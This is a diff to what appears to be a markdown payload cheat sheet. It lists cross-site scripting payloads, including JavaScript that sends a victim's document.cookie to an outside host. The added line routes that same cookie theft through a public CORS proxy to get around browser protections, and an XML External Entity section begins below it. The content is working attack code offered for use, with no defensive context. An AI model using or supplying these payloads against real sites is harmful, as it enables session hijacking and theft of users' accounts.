@@ -13,7 +13,7 @@
  - `('asd').link(eval("var asd=new Function('return prompt(\"h0nus\")'); asd();"))` (pops a prompt with h0nus string )
  - `('asd').anchor(prompt());` (just pops a prompt) 
  - `var url="https://any.host.name/",params="asd="+document.cookie,http=new XMLHttpRequest;http.open("GET",url+"?"+params,!0),http.send(null);` To steal cookies
-
+ - `var url="https://cors-anywhere.herokuapp.com/https://any.host.name/",params="asd="+document.cookie,http=new XMLHttpRequest;http.open("GET",url+"?"+params,!0),http.send(null);` To steal cookies and bypass/beat CORS
 ### XML External Entity
 ```xml
 <?xml version="1.0" ?>
